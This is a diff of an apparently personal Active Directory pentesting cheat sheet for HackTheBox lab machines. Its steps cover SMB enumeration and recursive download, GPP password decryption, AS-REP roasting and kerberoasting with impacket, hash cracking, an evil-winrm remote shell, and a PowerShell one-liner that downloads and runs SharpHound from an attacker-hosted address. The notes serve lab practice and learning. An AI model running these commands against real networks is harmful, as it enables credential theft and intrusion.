@@ -10,24 +10,29 @@
 9. `smbmap -H 10.10.10.161` try to share without password.
 10. `smbmap -H 10.10.10.161 -u 0xdf -p 0xdf`.
 11. `smbclient -N -L //10.10.10.161`.
-12. `smbclient //10.10.10.192/profiles$ -N -c "prompt OFF;recurse ON; lcd; mget *"` -> SMB one liner to download everythig recursively.
-13. If you find some DFS replication, search for "group.xml" or similar file with similar stuff, might find encrypted pssword.
-14. If encrypted password found try and decrypt with `gpp-decrypt <cipher_text>`.  Reason "n 2012 Microsoft published the AES key on MSDN, meaning that passwords set using GPP are now trivial to crack and considered low hanging fruit."
-15. If the user/password we get is service account and can not login, we can `impacket-GetADUsers -all active.htb/svc_tgs -dc-ip 10.10.10.100` to get list of usernames, we do kerberoasting later on.
-16. Enumerate RCP `rpcclient -U "" -N 10.10.10.161`, if u get shell `enumdomusers`, put it in `user.txt`.
-17. Enumerate AD for users again `python3 windapsearch.py -d htb.local --dc-ip 10.10.10.161 -U `.
-18. `python3 windapsearch.py -d htb.local --dc-ip 10.10.10.161 --custom "objectClass=*"`.
-19. `for user in $(cat users); do impacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done`, kerberoasting (get TGT without authentication).
-20. Find account configured with Service Principal Name (SPNs) `impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.10.10.100` (Need to find password first).
-21. Get TGT `impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.10.10.100 -request`.
-22. Now crach the hash `hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force`, or `john hash --fork=4 -w=<list>`
-23. `evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice` to get remote shell. port `5985` must be open.
-24. Now try to get information about privilge escalation.
-25. Run `neo4j`.
-26. Run `Bloodhound --no-sandbox` to open up webUI.
-27. OK now u need to transfer `Collection` scripts from the github repo to the victim.
-28. Load Bloodhound `iex(new-object net.webclient).downloadstring("http://10.10.14.6/SharpHound.ps1")`.
-29. Or directly run exe.
+12. SMB one liner to download everythig recursively.
+```diff
+@@ smbclient //10.10.10.192/profiles$ -N -c "prompt OFF;recurse ON; lcd; mget *" @@
++ If u have username
+@@ smbclient -U <domain.locala>/<username> //10.10.10.192/share  @@ and then enter password
+``` 
+14. If you find some DFS replication, search for "group.xml" or similar file with similar stuff, might find encrypted pssword.
+15. If encrypted password found try and decrypt with `gpp-decrypt <cipher_text>`.  Reason "n 2012 Microsoft published the AES key on MSDN, meaning that passwords set using GPP are now trivial to crack and considered low hanging fruit."
+16. If the user/password we get is service account and can not login, we can `impacket-GetADUsers -all active.htb/svc_tgs -dc-ip 10.10.10.100` to get list of usernames, we do kerberoasting later on.
+17. Enumerate RCP `rpcclient -U "" -N 10.10.10.161`, if u get shell `enumdomusers`, put it in `user.txt`.
+18. Enumerate AD for users again `python3 windapsearch.py -d htb.local --dc-ip 10.10.10.161 -U `.
+19. `python3 windapsearch.py -d htb.local --dc-ip 10.10.10.161 --custom "objectClass=*"`.
+20. `for user in $(cat users); do impacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done`, kerberoasting (get TGT without authentication).
+21. Find account configured with Service Principal Name (SPNs) `impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.10.10.100` (Need to find password first).
+22. Get TGT `impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.10.10.100 -request`.
+23. Now crach the hash `hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force`, or `john hash --fork=4 -w=<list>`
+24. `evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice` to get remote shell. port `5985` must be open.
+25. Now try to get information about privilge escalation.
+26. Run `neo4j`.
+27. Run `Bloodhound --no-sandbox` to open up webUI.
+28. OK now u need to transfer `Collection` scripts from the github repo to the victim.
+29. Load Bloodhound `iex(new-object net.webclient).downloadstring("http://10.10.14.6/SharpHound.ps1")`.
+30. Or directly run exe.
 ```diff
 + To install bloddhound
 + apt install bloodhound
